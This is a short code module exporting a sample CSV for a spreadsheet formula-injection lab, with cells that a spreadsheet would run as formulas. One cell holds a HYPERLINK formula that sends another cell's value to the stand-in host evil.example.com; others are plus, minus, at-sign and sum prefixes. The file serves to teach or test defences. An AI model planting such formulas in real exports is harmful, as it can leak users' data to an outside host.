/**
 * The CSV the /sheets-page/ lab starts from: an order export with fields a
 * spreadsheet would run as formulas when the file is opened (a link
 * formula, a sum, a negative-looking text, an at-sign call). Fictional
 * data only (example.com).
 */
export const HOSTILE_CSV = [
  'City,Amount,Note',
  'Lima,120,"=HYPERLINK(""https://evil.example.com/?q=""&A2,""Open"")"',
  'Quito,-5,+1+1',
  'Bogota,3.5,@SUM(A1)',
  'Santiago,40,=SUM(B2:B4)',
  'La Paz,TRUE,-2+3',
  '',
].join('\n');
